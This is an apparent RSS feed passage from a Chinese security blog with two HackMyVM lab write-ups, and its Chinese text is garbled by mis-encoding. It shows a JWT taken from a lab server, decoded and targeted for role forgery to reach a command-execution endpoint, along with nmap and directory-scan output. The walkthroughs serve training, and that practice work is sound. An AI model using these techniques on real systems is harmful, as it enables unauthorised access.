DLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ3pELENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLEtBQUssQ0FBQyxDQUFDLEtBQUssQ0FBQyxDQUFDO0FBQ3BCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLEtBQUssQ0FBQyxPQUFPLENBQUMsQ0FBQztBQUNwRCxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ0o7O0FBRUEsR0FBRyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUMzQixDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxHQUFHLENBQUMsSUFBSSxDQUFDO0FBQ3BCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQyxPQUFPLENBQUM7QUFDM0IsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsT0FBTyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQztBQUN2RCxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDTCxDQUFDOztBQUVELEdBQUcsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDbkMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQztBQUNwQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDO0FBQzFCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQztBQUN6QixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDbkIsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUM7QUFDekIsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE9BQU8sQ0FBQyxHQUFHLENBQUMsVUFBVSxDQUFDLENBQUMsQ0FBQyxDQUFDLFNBQVMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQzFELENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ04sQ0FBQyxDQUFDOztBQUVGLEdBQUcsQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxPQUFPLENBQUMsQ0FBQyxDQUFDLEtBQUssQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQzVDLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLHdCQUF3QixDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsT0FBTyxDQUFDLENBQUMsYUFBYSxDQUFDLENBQUM7QUFDakUsQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsQ0FBQyxDQUFDLHdCQUF3QixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsd0JBQXdCLENBQUMsVUFBVSxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDdEYsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxHQUFHLENBQUMsTUFBTSxDQUFDLEdBQUcsQ0FBQyxDQUFDLElBQUksQ0FBQztBQUNwQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQyxRQUFRLENBQUM7QUFDaEMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUMsVUFBVSxDQUFDLE1BQU07QUFDdEMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUNWLENBQUMsQ0FBQyxDQUFDLENBQUM7O0FBRUosQ0FBQyxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUMsT0FBTyxDQUFDLENBQUMsQ0FBQyx3QkFBd0IsQ0FBQyxLQUFLLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQzs7QUFFMUQsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUM7QUFDUixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLE9BQU8sQ0FBQyxDQUFDLENBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxPQUFPLENBQUMsQ0FBQyxPQUFPLENBQUMsR0FBRyxDQUFDLFVBQVUsQ0FBQztBQUNuRSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsT0FBTyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLENBQUMsQ0FBQztBQUN0QyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxHQUFHLENBQUMsQ0FBQyxJQUFJLENBQUM7QUFDeEMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQyxRQUFRLENBQUM7QUFDcEMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxVQUFVLENBQUMsTUFBTTtBQUMxQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDZCxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDUixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQztBQUNsQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLENBQUMsSUFBSSxDQUFDO0FBQ3BDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxDQUFDLFFBQVEsQ0FBQztBQUNoQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxVQUFVLENBQUMsTUFBTTtBQUN0QyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ1YsQ0FBQyxDQUFDLENBQUMsQ0FBQzs7QUFFSixDQUFDLENBQUMsQ0FBQyxDQUFDLEtBQUssQ0FBQyxPQUFPLENBQUMsQ0FBQyxDQUFDLEdBQUcsQ0FBQyxLQUFLLENBQUMsR0FBRzs7QUFFakMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxLQUFLLENBQUMsZUFBZSxDQUFDLENBQUMsQ0FBQyxlQUFlLENBQUMsT0FBTyxDQUFDO0FBQ3BELENBQUMsQ0FBQyxDQUFDLENBQUMsRUFBRSxDQUFDLENBQUMsQ0FBQyxlQUFlLENBQUMsQ0FBQztBQUMxQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLEdBQUcsQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLENBQUMsSUFBSSxDQUFDO0FBQ3BDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQyxDQUFDLFFBQVEsQ0FBQztBQUNoQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsT0FBTyxDQUFDLEVBQUUsQ0FBQyxNQUFNO0FBQzNDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7QUFDVixDQUFDLENBQUMsQ0FBQyxDQUFDOztBQUVKLENBQUMsQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsS0FBSyxDQUFDLG9CQUFvQixDQUFDLE9BQU8sQ0FBQzs7QUFFdEQsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQztBQUNwQixDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLE1BQU0sQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDLENBQUMsUUFBUSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDO0FBQ2hFLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsTUFBTSxDQUFDO0FBQ3ZCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztBQUNMLENBQUMsQ0FBQzs7QUFFRixHQUFHLENBQUMsTUFBTSxDQUFDLElBQUksQ0FBQyxDQUFDLE9BQU8sQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO0FBQ2hDLENBQUMsQ0FBQyxDQUFDLENBQUMsT0FBTyxDQUFDLEdBQUcsQ0FBQyxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsT0FBTyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxDQUFDO0FBQ3hELENBQUMsQ0FBQzsifQ==
```

è®¿é—®`/sign`è¿”å›äº†ä¸€ä¸²` jwt`ï¼Œè®¿é—®`/execute`æç¤º` permission denied`ï¼Œ è®¿é—®`/server.js`è¿”å›äº† `Express.js `åç«¯çš„æºç 

##### ` jwt`

çœ‹äº†å¤§ä½¬`WP`è¯´ä¸éš¾çŒœå‡ºæ˜¯è¦ä¿®æ”¹` jwt` è·å¾—æƒé™ï¼Œå†è®¿é—® `/execute `æ‰§è¡Œå‘½ä»¤

```shell
#https://jwt.io/
{'status':'signed','data':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg1Mjg3NjIsImV4cCI6MTc0ODUzMDU2Mn0.F8hwKtxcpYq9Hgm0w-AoiZQT1sqb69kwMTN4l_768z0'}

---
{
  'uid': -1,
  'role': 'guest',
  'iat': 1748528762,
  'exp': 1748530562
}
```

å…ˆæ‰¾ä¸ª[[ç½‘é¡µ](https://www.bejson.com/jwt/)](https://www.bejson.com/jwt/)è§£ç `jwt`,æ˜¾ç¤ºè§’è‰²æ˜¯` guest` 

![image-20250529224940177](https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529224940177.png)

éœ€è¦å°†è¿™é‡Œçš„` guest` æ”¹ä¸º `admin` ä¹‹ç±»ï¼Œä½†æ˜¯ç›®å‰å¹¶æ²¡æœ‰` secret`å®¡è®¡` server.js` çš„æºç 

![image-20250529225043847](https://raw.githubusercontent.com/pingsag3/blog_img/main/images/image-20250529225043847.png)

`secret`æ˜¯ä» `process.env.JWT_SECRET `è·å–çš„ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/hackmyvm%20Devoops-ce-shi-ji-lu.html</guid><pubDate>Fri, 30 May 2025 12:47:11 +0000</pubDate></item><item><title>hackmyvm homelab æµ‹è¯•è®°å½•</title><link>https://pingsag3.github.io/post/hackmyvm%20homelab%20-ce-shi-ji-lu.html</link><description># hackmyvm homelab æµ‹è¯•è®°å½•

 


[å¤§ä½¬WP](https://www.bilibili.com/video/BV1gN5WzMEB5)




### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://hackmyvm.eu/machines/machine.php?vm=Homelab
https://maze-sec.com/library/
```

```shell
éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸
çŸ¥è¯†ç‚¹ï¼šæ‰«æï¼Œ`bypass-403`å·¥å…·ï¼Œçˆ†ç ´`PKCS#8`å¯†ç ï¼Œ`openvpn`ä½¿ç”¨ï¼Œå®¶ç›®å½•æ–‡ä»¶ææƒ
```

### 2. ä¿¡æ¯æ”¶é›†

### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.31.65   82:76:60:93:03:34       (Unknown: locally administered)
â””â”€# IP=192.168.31.65
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 19:16 CST
Nmap scan report for homelab (192.168.31.65)
Host is up (0.0017s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Unix))
|_http-title: Mac OS X Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.62 (Unix)
|_http-favicon: Apache on Mac OS X
MAC Address: 82:76:60:93:03:34 (Unknown)
```

### ç›®å½•æ‰«æ

```shell
â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.h
â””â”€# dirsearch -u http://$IP  -x 403 -e txt,php,html
[19:19:13] 200 -  820B  - /cgi-bin/printenv
[19:19:13] 200 -    1KB - /cgi-bin/test-cgi
[19:19:15] 200 -    4KB - /error.html
[19:19:15] 200 -    8KB - /favicon.ico
[19:19:22] 301 -  313B  - /script  -&gt;  http://192.168.31.65/script/
[19:19:22] 301 -  319B  - /service?Wsdl  -&gt;  http://192.168.31.65/service/?Wsdl
[19:19:22] 301 -  314B  - /service  -&gt;  http://192.168.31.65/service/
[19:19:23] 301 -  312B  - /style  -&gt;  http://192.168.31.65/style/
```

çœ‹ç¾¤ä¸»`wp`ä»‹ç»`styleæ˜¯css`ï¼Œ`scriptæ˜¯js`ï¼Œæ‰€ä»¥å…¥å£ç‚¹å°±æ˜¯`service`ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/hackmyvm%20homelab%20-ce-shi-ji-lu.html</guid><pubDate>Sat, 17 May 2025 01:33:20 +0000</pubDate></item></channel></rss>